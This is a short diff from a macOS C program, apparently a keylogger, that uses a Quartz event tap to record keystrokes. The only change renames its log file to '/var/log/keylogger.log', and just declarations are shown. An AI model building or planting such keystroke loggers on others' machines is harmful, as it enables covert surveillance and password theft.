@@ -9,7 +9,7 @@
 // https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
 
 FILE *logfile = NULL;
-const char *logfileLocation = "/var/log/keystroke.log";
+const char *logfileLocation = "/var/log/keylogger.log";
 
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int);
